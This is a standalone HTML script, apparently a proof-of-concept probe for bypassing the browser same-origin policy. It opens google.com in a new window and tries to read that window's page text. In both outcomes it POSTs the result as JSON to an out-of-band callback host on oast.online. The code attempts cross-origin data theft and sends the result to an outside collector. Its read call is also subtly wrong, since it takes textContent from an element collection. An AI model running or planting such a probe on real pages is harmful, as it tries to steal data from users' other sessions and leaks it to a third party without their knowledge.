  <script>
const oast = "https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/";

const w = window.open("https://google.com/");

setTimeout(() => {
    try {
        const secret = w.document.getElementsByTagName("body").textContent;

        const result = {
            status: "SOP_BYPASS",
            value: secret
        };

        document.body.innerHTML =
            "<pre>" + JSON.stringify(result, null, 2) + "</pre>";

        fetch(oast, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(result)
        });

    } catch (e) {
        const result = {
            status: "SOP_BLOCKED",
            name: e.name,
            message: e.message
        };

        document.body.innerHTML =
            "<pre>" + JSON.stringify(result, null, 2) + "</pre>";

        fetch(oast, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(result)
        });
    }
}, 3000);
</script>
